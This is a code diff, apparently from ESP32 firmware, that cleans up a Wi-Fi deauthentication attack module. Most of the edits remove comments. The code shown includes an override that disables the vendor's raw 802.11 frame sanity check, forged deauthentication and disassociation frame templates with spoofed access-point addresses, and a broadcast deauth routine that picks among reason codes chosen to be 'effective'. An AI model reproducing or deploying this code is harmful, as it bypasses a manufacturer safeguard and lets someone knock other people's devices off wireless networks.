@@ -15,7 +15,7 @@
 void wifi_deauth_task(void *param);
 
 int ieee80211_raw_frame_sanity_check(const void *frame, int len) {
-  return 0; // don't give a fuck, screw you espressif
+  return 0;
 }
 
 static const uint8_t deauth_packet_template[26] = { 
@@ -24,7 +24,7 @@ static const uint8_t deauth_packet_template[26] = {
     0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source
     0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // bssid
     0x00, 0x00,                         // sequence
-    0x07, 0x00                          // reason code 7
+    0x07, 0x00
 };
 
 // 0xA0 type = management disassoc frame
@@ -35,12 +35,12 @@ static const uint8_t disassoc_packet_template[26] = {
     0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // spoofed AP MAC
     0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (same as AP)
     0x00, 0x00,             // sequence
-    0x07, 0x00              // reason code (7 = leaving)
+    0x07, 0x00
 };
 
 static uint32_t last_sent = 0;
-extern const uint8_t dual_band_channels[];
-extern const size_t dual_band_channels_size;
+extern const uint8_t* get_scan_channels(void);
+extern const size_t get_scan_channels_size(void);
 // static uint16_t ap_count = 0;
 // static wifi_ap_record_t *scanned_aps = NULL;
 TaskHandle_t deauth_task_handle = NULL;
@@ -77,7 +77,7 @@ esp_err_t wifi_manager_broadcast_deauth(uint8_t bssid[6], int channel, uint8_t *
         return ESP_ERR_INVALID_ARG;
     }
     
-    // just set channel, no mode changes needed since we're already in ap mode
+    // Set channel, no mode changes needed since we're already in AP mode
     esp_err_t err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
     if(err != ESP_OK) {
         ESP_LOGE(TAG, "failed to set channel %d: %s", channel, esp_err_to_name(err));
@@ -90,12 +90,12 @@ esp_err_t wifi_manager_broadcast_deauth(uint8_t bssid[6], int channel, uint8_t *
     memcpy(deauth_frame, frame_template, 26);
 
     static const uint8_t effective_reasons[] = {
-        2,  // Previous authentication no longer valid
-        7,  // Class 3 frame received from nonassociated STA  
-        14, // Message integrity code (MIC) failure
-        15, // Authentication expired (requires complete new auth)
-        16, // Group key handshake timeout
-        23  // IEEE 802.1X authentication failed 
+        2,
+        7,  
+        14,
+        15,
+        16,
+        23 
     };
     deauth_frame[24] = effective_reasons[esp_random() % 6];  // cycle through effective reasons
     deauth_frame[25] = 0x00;
